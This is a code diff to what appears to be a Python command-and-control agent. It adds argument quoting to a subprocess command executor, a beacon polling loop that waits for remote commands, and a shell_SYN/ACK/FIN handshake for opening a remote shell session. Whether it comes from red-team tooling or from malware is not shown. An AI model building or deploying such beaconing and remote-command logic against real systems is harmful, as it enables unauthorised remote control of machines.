@@ -5,6 +5,8 @@ import os
 import getpass
 import socket
 
+import pipes
+
 from threading import Thread
 from tempfile import NamedTemporaryFile
 import subprocess
@@ -94,7 +96,8 @@ def _execute(cmd):
 def execute(cmd):
     if type(cmd) is not str:
         # AAAAAHHHHHHHHHHHHHHHHHHHHHHHHH
-        cmd =  ' '.join([str(s) for s in cmd])
+        #cmd =  ' '.join([str(s) for s in cmd])
+        cmd =  ' '.join([pipes.quote(str(s)) for s in cmd])
         print("Str cmd: {}".format(cmd))
         
     thread = Thread(target = _execute, args = (cmd,) )
@@ -152,6 +155,36 @@ def invoke_module(m, args=()):
 
 def set(k, v):
     SETTINGS[k] = v
+
+def poll_for_work(max_duration, max_attempts, freq):
+    print_debug("\n\nPolling for work")
+    start = time.time()
+    attempts = 0
+    while time.time() - start < max_duration and attempts < max_attempts:
+        payload = do("get_beacon")
+
+        res = do("send_msg", (payload,))
+        if get_cmd(res):
+            return True
+        attempts = attempts + 1
+        time.sleep(freq)
+        
+
+def shell_SYN(*args):
+    res = do("send_msg", ("shell_ACK", True) )
+    max_duration = int(SETTINGS["beacon"]) * 5
+    max_attempts = 30
+    freq = 1
+    msg = ["shell_FIN", True]
+    
+    if not get_cmd(res) and not poll_for_work(max_duration, max_attempts, freq):
+        print_debug("\n\nPoll for work failed")
+        msg[1] = False
+    else:
+        time.sleep(2)
+
+    res = do("send_msg", msg )
+        
 
 def do(cmd, args=()):
     print_debug("Doing {} ({})".format(cmd, args))
